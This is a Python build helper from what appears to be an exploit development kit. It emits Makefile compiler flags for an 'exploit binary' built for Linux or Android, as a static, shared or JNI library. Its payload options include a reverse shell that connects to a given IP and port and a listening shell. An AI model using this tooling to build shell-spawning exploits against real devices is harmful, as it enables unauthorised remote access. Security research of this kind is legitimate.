#!/usr/bin/env python

import argparse
import sys
import os

def main():
    parser = argparse.ArgumentParser(
        prog='payload-flags',
        description='Generates CFLAGS for exploit binary',
    )

    entrypoint_group = parser.add_mutually_exclusive_group(required=True)
    payload_group = parser.add_mutually_exclusive_group(required=True)
    target_group = parser.add_mutually_exclusive_group(required=True)

    entrypoint_group.add_argument('--static', action='store_true', help='Build binary as static executable')
    entrypoint_group.add_argument('--binary', action='store_true', help='Build binary as regular executable')
    entrypoint_group.add_argument('--shared', action='store_true', help='Build binary as shared library which calls the main on load')
    entrypoint_group.add_argument('--jni', action='store_true', help='Build binary as a JNI shared library which calls main on JNI load')

    payload_group.add_argument('--reverse-shell', action='store_true')
    payload_group.add_argument('--listening-shell', action='store_true')
    payload_group.add_argument('--shell', action='store_true')

    target_group.add_argument('--linux', action='store_true', help='Build binary with host c compiler for regular linux')
    target_group.add_argument('--android', action='store_true', help='Build with android ndk for running on phone')

    parser.add_argument('--ip', help='IP address for reverse shell to connect to')
    parser.add_argument('--port', type=int, help='Port for listning shell and reverse shell')

    args = parser.parse_args()

    if (args.listening_shell or args.reverse_shell) and (args.port is None):
        parser.error('--port required')

    if args.reverse_shell and args.ip is None:
        parser.error('--ip required')

    if args.shell:
        flags = ''
    elif args.listening_shell:
        flags = f'-DLISTENING_SHELL -DROOT_PAYLOAD_PORT={args.port} '
    elif args.reverse_shell:
        flags = f'-DREVERSE_SHELL -DROOT_PAYLOAD_PORT={args.port} -DROOT_PAYLOAD_IP={args.ip}'

    if args.static:
        flags += '-static -fno-pie -DEXPLOIT_STATIC'
    elif args.binary:
        flags += '-DEXPLOIT_STATIC'
    elif args.shared:
        flags += '-shared -llog -DEXPLOIT_SHARED'
    elif args.jni:
        flags += '-shared -llog -DEXPLOIT_JNI'

    if args.linux:
        cc = 'gcc'
        cxx = 'g++'
    elif args.android:
        ndk_path = os.environ.get('ANDROID_NDK_HOME')
        if ndk_path is None:
            print('Error: ANDROID_NDK_HOME env var must be set to build for android')
            sys.exit(1)

        # TODO: support android arm32 if needed
        cc = f'{ndk_path}/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang'
        cxx = f'{cc}++'

    common_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    print(f'$(eval CCFLAGS += -I{common_dir} {flags}) $(eval CC := {cc}) $(eval CXX := {cxx})')

if __name__ == '__main__':
    main()
